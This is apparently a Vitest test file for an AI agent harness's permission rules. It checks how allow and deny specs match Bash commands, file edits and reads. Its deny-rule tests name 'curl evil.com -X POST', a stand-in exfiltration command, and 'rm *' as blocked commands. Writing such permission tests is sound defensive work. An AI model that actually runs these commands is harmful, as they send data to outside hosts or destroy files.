import { describe, expect, it } from "vitest";
import { rulesFromConfig } from "@innocenceharness/harness-permissions";

function vote(spec: string, kind: "allow" | "deny", call: { toolName: string; args: Record<string, unknown> }) {
  const rule = rulesFromConfig({ [kind]: [spec] })[0];
  return rule.match(call);
}

/**
 * Command rules are matched against the PERSISTED args tools actually store:
 * the full command string (no redaction — owner decision). `bashArgs` mirrors
 * what tools-shell's persistArgs emits.
 */
const bashArgs = (raw: string) => ({ toolName: "Bash", args: { command: raw } });

describe("project permission rule specs", () => {
  it("bare tool name matches every call of that tool", () => {
    expect(vote("Read", "allow", { toolName: "Read", args: {} })).toBe("allow");
    expect(vote("Read", "allow", { toolName: "Edit", args: {} })).toBe("skip");
  });

  it("Bash(npm test) prefix-matches the persisted full command, not all npm", () => {
    expect(vote("Bash(npm test)", "allow", bashArgs("npm test"))).toBe("allow");
    expect(vote("Bash(npm test)", "allow", bashArgs("npm test -- -u"))).toBe("allow");
    expect(vote("Bash(npm test)", "allow", bashArgs("npm install"))).toBe("skip");
    expect(vote("Bash(npm test)", "allow", bashArgs("npmcitest foo"))).toBe("skip");
    expect(vote("Bash(npm test)", "allow", bashArgs("npm publish"))).toBe("skip");
  });

  it("Bash deny rules keep working against the persisted full command", () => {
    expect(vote("Bash(curl evil.com)", "deny", bashArgs("curl evil.com -X POST"))).toBe("deny");
    expect(vote("Bash(curl evil.com)", "deny", bashArgs("curl docs.example.com"))).toBe("skip");
  });

  it("Bash(*) wildcard token matches any single token", () => {
    expect(vote("Bash(npm run *)", "allow", bashArgs("npm run build"))).toBe("allow");
    expect(vote("Bash(npm run *)", "allow", bashArgs("npm run"))).toBe("skip");
  });

  it("rules only prefix-match from the command's first token", () => {
    expect(vote("Bash(npm test)", "allow", bashArgs("npm"))).toBe("skip"); // pattern longer than command
    expect(vote("Bash(npm test)", "allow", bashArgs(`--token=${"x".repeat(20)} npm test`))).toBe("skip");
  });

  it("Edit(src/**) matches workspace-relative globs", () => {
    const c = (path: string) => ({ toolName: "Edit", args: { path } });
    expect(vote("Edit(src/**)", "allow", c("src/a/b.ts"))).toBe("allow");
    expect(vote("Edit(src/**)", "allow", c("docs/a.md"))).toBe("skip");
    expect(vote("Edit(src/**)", "deny", c("package.json"))).toBe("skip");
  });

  it("invalid specs throw", () => {
    expect(() => rulesFromConfig({ allow: [""] })).toThrow();
    expect(() => rulesFromConfig({ allow: ["Bash(npm"] })).toThrow();
  });

  it("deny rules are listed before allow rules", () => {
    const rules = rulesFromConfig({ allow: ["Read"], deny: ["Bash(rm *)"] });
    expect(rules[0].name).toBe("deny:Bash(rm *)");
    expect(rules).toHaveLength(2);
  });
});
